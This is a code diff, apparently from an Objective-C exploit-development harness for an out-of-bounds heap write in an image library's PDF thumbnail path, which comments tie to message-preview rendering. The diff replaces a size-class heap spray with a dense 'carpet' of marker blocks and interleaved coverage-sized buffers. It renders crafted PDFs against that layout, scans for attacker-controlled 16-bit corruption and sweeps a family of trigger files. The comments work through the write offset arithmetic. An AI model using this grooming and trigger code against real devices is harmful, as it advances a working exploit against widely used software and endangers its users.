@@ -12,10 +12,15 @@
 // through CGImageSourceCreateThumbnailAtIndex (the Messages/WhatsApp preview
 // path).  Fixed in 26.7.1 — our build is 26.2b1, so it is present.
 //
-// The local research (Default Project\cve86950) verified the arithmetic: the
-// OOB distance is 4*(width_px + K) bytes BEFORE the coverage buffer, with
-// width_px = 64*dx — i.e. the write distance is fully controlled by the glyph
-// geometry (dx, K), and the write goes BEFORE the row buffer.
+// The local research (Default Project\cve86950 + EXPLOIT-86950-PLAN.md, from the
+// public PoC backtrace at aa_cache_render+2120) gives the semantics: the
+// coverage row is 16-bit values and the OOB is
+//     *(uint16 *)(cov + 2*i) += delta        (delta small, positive -- a +1 bump)
+// where i is derived from the glyph edge coordinates (the composite scales /
+// bbox-lie) and the buffer's real width comes from the bbox-lie DX
+// (width_px = 32*DX; DX >= 32 -> malloc, DX <= 31 -> alloca/stack).  The index
+// runs far past the ~4.3 KB buffer, so the write lands at cov+2*i tens of KB
+// away -- NOT "before the buffer", and NOT selectable by the buffer's class.
 //
 // This module drives the ImageIO thumbnail path exactly like render.c does:
 // no CGContext of our own, no font smoothing calls — ImageIO's internal render
@@ -64,74 +69,95 @@ static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
 // inside one of our blocks, the marker changes — that is a proof of
 // attacker-controlled corruption, usable even when the process survives.
 static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) {
-    const uint64_t MARK = 0xA5A5A5A5A5A5A5A5ULL;
-    // spray a ladder of size classes: the freelist corruption was observed for
-    // ~1.8 KB and ~3.7 KB allocations, so cover 128 B .. 8 KB and put `regions`
-    // blocks in each class.  Plain C arrays, no NSValue boxing.
-    //
-    // Geometry (EXPLOIT-86950-PLAN.md + gen_leaf.py): the OOB write lands
-    // 4*(width_px+16) bytes BEFORE the coverage buffer, and for the
-    // lf_dxNN_LLLLLL family width_px = leaf * (32767/16384)^9 * 1024/16384
-    // (Tf=1024, upm=16384, N=9 composite levels).  lf_dx33_000500 is therefore
-    // ~16k px wide: a ~64 KB buffer and a ~64 KB write distance -- 8x beyond
-    // the biggest fixed class, which is why the ladder alone can never be hit.
-    // The calibrated trigger's own class and its distance are appended.
-    size_t szs[] = { 128, 256, 512, 1024, 2048, 3744, 4096, 8192, 0, 0 };
-    int nsz = (int)(sizeof(szs) / sizeof(szs[0]));
-    int dx = 0, leaf = 0;
-    if (sscanf(pdfName.UTF8String, "lf_dx%2d_%6d", &dx, &leaf) == 2 && leaf > 0) {
-        double w = (double)leaf * pow(32767.0 / 16384.0, 9.0) * 1024.0 / 16384.0;
-        szs[nsz - 2] = (size_t)(4.0 * w);            // the coverage buffer's class
-        szs[nsz - 1] = (size_t)(4.0 * (w + 16.0));   // the documented write distance
-        AvePost([NSString stringWithFormat:@"86950 groom geometry: dx=%d leaf=%d "
-                 @"width_px=%.0f buf=%zu B dist=%zu B (the write aims that far "
-                 @"before the buffer)", dx, leaf, w, szs[nsz - 2], szs[nsz - 1]]);
-    }
-    int cap = regions * nsz;
+    (void)each;
+    const uint64_t FILL = 0xA5A5A5A5A5A5A5A5ULL;
+    // The reference layout that actually hit (`oob: *** HIT obj[42]
+    // 0xC02A->0xC02B`, tpOOBDetect/tpGroomHeap): `regions` detector blocks of
+    // 4096 B, each carrying the 16-bit marker 0xC000+obj at +2048 and +2050,
+    // interleaved with coverage-sized groom buffers so the raster's own
+    // allocation lands inside the carpet.  A small-size-class ladder can not
+    // cover the write: the OOB index i (from the edge coordinates) puts the
+    // 16-bit += at cov+2*i, potentially tens of KB past a ~4.3 KB buffer; a
+    // dense 4 KB carpet covers every i.  Two measured lessons built in:
+    //   - the 15 Nov CFNetwork freelist trap: our logger must not die between
+    //     carpet and verdict (the module order already puts the groom first);
+    //   - the 15/16 Nov runs: 8-class ladders AND appended ~64 KB classes all
+    //     read 0 corrupted words, because neither matched the real target.
+    size_t groomSz[] = { 4032, 4288 };   // 4*(32*DX+16) for DX=31 and DX=33
+    int nGroom = (int)(sizeof(groomSz) / sizeof(groomSz[0]));
+    int cap = regions * (1 + nGroom);
     void **ptrs = (void **)calloc((size_t)cap, sizeof(void *));
     size_t *szl = (size_t *)calloc((size_t)cap, sizeof(size_t));
-    int n = 0;
-    if (!ptrs || !szl) { free(ptrs); free(szl); return -1; }
-    for (int si = 0; si < nsz; si++) {
-        for (int i = 0; i < regions; i++) {
-            if (n >= cap) break;
-            void *p = malloc(szs[si]);
-            if (!p) break;
-            memset(p, 0xA5, szs[si]);
-            ((uint64_t *)p)[0] = MARK ^ (uint64_t)(0x10000 * si + i);
-            ((uint64_t *)p)[1] = MARK;
-            ptrs[n] = p; szl[n] = szs[si]; n++;
+    int *ids  = (int *)calloc((size_t)cap, sizeof(int));
+    if (!ptrs || !szl || !ids) { free(ptrs); free(szl); free(ids); return -1; }
+    int n = 0, obj = 0;
+    for (int r = 0; r < regions; r++) {
+        void *d = malloc(4096);
+        if (d) {
+            memset(d, 0xA5, 4096);
+            uint16_t *m = (uint16_t *)d;
+            m[1024] = (uint16_t)(0xC000 + obj);   // +2048
+            m[1025] = (uint16_t)(0xC000 + obj);   // +2050
+            ptrs[n] = d; szl[n] = 4096; ids[n] = obj; n++; obj++;
+        }
+        for (int gi = 0; gi < nGroom; gi++) {
+            void *g = malloc(groomSz[gi]);
+            if (g) {
+                memset(g, 0xA5, groomSz[gi]);
+                ptrs[n] = g; szl[n] = groomSz[gi]; ids[n] = -1; n++;
+            }
         }
     }
-    AvePost([NSString stringWithFormat:@"86950 groom: %d blocks tagged across %d size "
-             @"classes (128 B .. 8 KB)", n, nsz]);
+    AvePost([NSString stringWithFormat:@"86950 carpet: %d detectors x 4096 B "
+             @"(marker 0xC000+obj at +2048/+2050) interleaved with 4032 B/4288 B "
+             @"coverage-class buffers", obj]);
+    int dx = 0, leaf = 0;
+    if (sscanf(pdfName.UTF8String, "lf_dx%2d_%6d", &dx, &leaf) == 2 && leaf > 0) {
+        AvePost([NSString stringWithFormat:@"86950 geometry: dx=%d leaf=%d "
+                 @"width_px=%d -> coverage buffer ~%zu B (4*(32*DX+16); DX>=32 is "
+                 @"the malloc side); the write lands at cov+2*i, far past it",
+                 dx, leaf, 32 * dx, (size_t)(4 * (32 * dx + 16))]);
+    }
 
-    NSString *r = ModThumbPDF(pdfName, [NSString stringWithFormat:@"86950-G%d", n], maxPx);
-    AvePost([NSString stringWithFormat:@"86950 groom-render: %@", r]);
+    NSString *r = ModThumbPDF(pdfName, [NSString stringWithFormat:@"86950-C%d", obj], maxPx);
+    AvePost([NSString stringWithFormat:@"86950 carpet-render: %@", r]);
 
     int corrupt = 0;
     for (int i = 0; i < n; i++) {
         void *p = ptrs[i];
         size_t sz = szl[i];
         uint64_t *q = (uint64_t *)p;
-        // word 0 holds this block's unique tag, and that is exactly where a
-        // distance-matched write lands, so compare it against the tag we wrote
-        uint64_t want0 = MARK ^ (uint64_t)(0x10000 * (i / regions) + (i % regions));
+        uint64_t want0 = FILL;
+        if (ids[i] >= 0) {
+            // little-endian: the u64 at +2048 is (u16@+2048) | ((u16@+2050) << 16)
+            uint32_t mark = (uint32_t)(0xC000 + ids[i]);
+            want0 = ((uint64_t)mark << 16) | mark;   // the +2048/+2050 pair
+        }
         for (size_t off = 0; off + 8 <= sz; off += 8) {
-            uint64_t want = (off == 0) ? want0 : 0xA5A5A5A5A5A5A5A5ULL;
+            uint64_t want = (off == 0) ? want0 : FILL;
             if (q[off / 8] != want) {
-                AvePost([NSString stringWithFormat:@"86950 CORRUPTION block %d (+%zu) "
-                         @"@+%#zx = %#llx", i, sz, off, q[off / 8]]);
+                uint64_t got = q[off / 8];
+                if (ids[i] >= 0 && off == 0) {
+                    AvePost([NSString stringWithFormat:@"86950 CORRUPTION detector "
+                             @"obj=%d marker %04x/%04x -> %04x/%04x (+%zu): a live "
+                             @"16-bit += inside OUR carpet", ids[i],
+                             0xC000 + ids[i], 0xC000 + ids[i],
+                             (unsigned)(got & 0xffff), (unsigned)(got >> 16), sz]);
+                } else {
+                    AvePost([NSString stringWithFormat:@"86950 CORRUPTION block %d (+%zu) "
+                             @"@+%#zx = %#llx", i, sz, off, got]);
+                }
                 corrupt++;
-                if (corrupt > 12) break;
+                if (corrupt > 16) break;
             }
         }
         free(p);
-        if (corrupt > 12) break;
+        if (corrupt > 16) break;
     }
     free(ptrs);
     free(szl);
-    AvePost([NSString stringWithFormat:@"86950 groom scan: %d corrupted words", corrupt]);
+    free(ids);
+    AvePost([NSString stringWithFormat:@"86950 carpet scan: %d corrupted words", corrupt]);
     return corrupt;
 }
 
@@ -297,17 +323,19 @@ static void ModSweepLeaf(void) {
     if (!fam.count) return;
     AvePost([NSString stringWithFormat:@"86950 LEAF family: %d PDFs (DX 31/33 x leaf "
              @"500..32000, the crashing font's own structure)", (int)fam.count]);
+    // Each geometry gets its OWN carpet: the write offset is cov+2*i with i set
+    // by that file's edge coordinates, so one carpet cannot cover the whole
+    // family -- but one carpet per file covers each i range.  A crash mid-sweep
+    // still leaves the last file in the log (canary + carpet lines).
     for (NSString *f in fam) {
-        NSString *tag = [NSString stringWithFormat:@"86950-L%@",
-                         [f substringWithRange:NSMakeRange(3, 12)]];
-        NSString *r = ModThumbPDF(f, tag, 32);
-        AvePost([NSString stringWithFormat:@"86950LF %@ -> %@", f, r]);
-        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
-            AvePost([NSString stringWithFormat:@"86950 LEAF STOPPED on %@", f]);
+        int c = ModGroomScan(64, 0, f, 32);
+        AvePost([NSString stringWithFormat:@"86950LF-C %@ -> %d corrupted words", f, c]);
+        if (c > 0) {
+            AvePost([NSString stringWithFormat:@"86950 LEAF STOPPED on %@ (carpet hit)", f]);
             return;
         }
     }
-    AvePost(@"86950 LEAF family: every PDF returned without a fault");
+    AvePost(@"86950 LEAF family: every carpet came back clean");
 }
 
 // Repeat the calibrated trigger many times in ONE run.  The crash is layout
@@ -368,7 +396,7 @@ NSString *ModCVE86950(void) {
     NSString *calPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:cal];
     if ([[NSFileManager defaultManager] fileExistsAtPath:calPath]) {
         AvePost([NSString stringWithFormat:@"86950 CALIBRATED TRIGGER %@ + groom", cal]);
-        int corrupt = ModGroomScan(64, 8 << 20, cal, 32);
+        int corrupt = ModGroomScan(128, 8 << 20, cal, 32);   // reference detector count
         if (corrupt) {
             AvePost(@"86950 verdict: HEAP CORRUPTION CONFIRMED in our tagged regions");
             return [NSString stringWithFormat:@"86950: HEAP CORRUPTION CONFIRMED (%d words "
